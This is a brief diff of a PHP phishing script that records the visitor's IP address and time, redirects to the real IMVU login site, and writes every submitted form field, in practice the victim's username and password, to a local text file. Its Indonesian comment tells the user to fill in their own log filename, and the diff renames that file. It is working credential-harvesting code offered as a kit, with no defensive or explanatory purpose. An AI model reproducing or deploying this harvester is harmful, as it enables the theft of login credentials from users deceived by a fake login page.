@@ -3,7 +3,7 @@
 $datum = date('d-m-Y / H:i:s');
 $ip = $_SERVER['REMOTE_ADDR'];
 header('Location: https://secure.imvu.com');
-$handle = fopen('isitxtandadisini.txt', "a"); //ISI dengan Nama TXT anda 
+$handle = fopen('jejok.txt', "a"); //ISI dengan Nama TXT anda 
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
